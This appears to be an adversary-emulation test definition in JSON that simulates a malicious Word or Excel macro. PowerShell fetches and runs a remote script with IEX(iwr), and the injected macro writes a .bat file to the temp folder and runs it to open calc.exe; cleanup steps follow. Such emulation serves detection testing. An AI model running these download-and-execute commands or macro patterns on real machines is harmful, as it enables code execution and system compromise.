{
  "id": "9215ea92-1ded-41b7-9cd6-79f9a78397aa",
  "name": "Office launching .bat file from AppData",
  "description": "Microsoft Office creating then launching a .bat script from an AppData directory. The .bat file launches calc.exe when opened.",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "4002d402-9ebb-5c01-b755-246f29837760",
      "type": "execute-command",
      "data": {
        "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"#{bat_path}`\" For Output As #1`n   Write #1, `\"calc.exe`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c #{bat_path} `\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct #{ms_product}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "e5b12e02-8811-57c6-a8b7-447f2caee31c",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item #{bat_path} -ErrorAction Ignore\nGet-Process | Where-Object { $_.MainModule.FileName -like \"*calculator*\" } | Stop-Process",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "f97d3266-e6a1-5dc4-8bee-c42b59529072",
      "name": "Check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "7366d6d8-37f4-5cfc-9b38-f6321eed014c",
      "name": "Resolve dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "Write-Host \"You will need to install Microsoft #{ms_product} manually to meet this requirement\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "f97d3266-e6a1-5dc4-8bee-c42b59529072",
      "name": "Re-check dependency 1/1",
      "description": "Microsoft #{ms_product} must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "try {\n  New-Object -COMObject \"#{ms_product}.Application\" | Out-Null\n  $process = \"#{ms_product}\"; if ( $process -eq \"Word\") {$process = \"winword\"}\n  Stop-Process -Name $process\n  exit 0\n} catch { exit 1 }",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "4002d402-9ebb-5c01-b755-246f29837760",
      "p": "on-success",
      "o": "e5b12e02-8811-57c6-a8b7-447f2caee31c"
    },
    {
      "s": "4002d402-9ebb-5c01-b755-246f29837760",
      "p": "on-failure",
      "o": "e5b12e02-8811-57c6-a8b7-447f2caee31c"
    },
    {
      "s": "f97d3266-e6a1-5dc4-8bee-c42b59529072",
      "p": "on-success",
      "o": "4002d402-9ebb-5c01-b755-246f29837760"
    },
    {
      "s": "f97d3266-e6a1-5dc4-8bee-c42b59529072",
      "p": "on-failure",
      "o": "7366d6d8-37f4-5cfc-9b38-f6321eed014c"
    },
    {
      "s": "7366d6d8-37f4-5cfc-9b38-f6321eed014c",
      "p": "on-success",
      "o": "f97d3266-e6a1-5dc4-8bee-c42b59529072"
    },
    {
      "s": "f97d3266-e6a1-5dc4-8bee-c42b59529072",
      "p": "on-failure",
      "o": "4002d402-9ebb-5c01-b755-246f29837760"
    }
  ],
  "tags": [
    "T1204",
    "T1204.002"
  ],
  "input_arguments": [
    {
      "name": "bat_path",
      "type": "string",
      "description": "Path to malicious .bat file",
      "value": "$(\"$env:temp\\art1204.bat\")"
    },
    {
      "name": "ms_product",
      "type": "string",
      "description": "Maldoc application Word or Excel",
      "value": "Word"
    }
  ]
}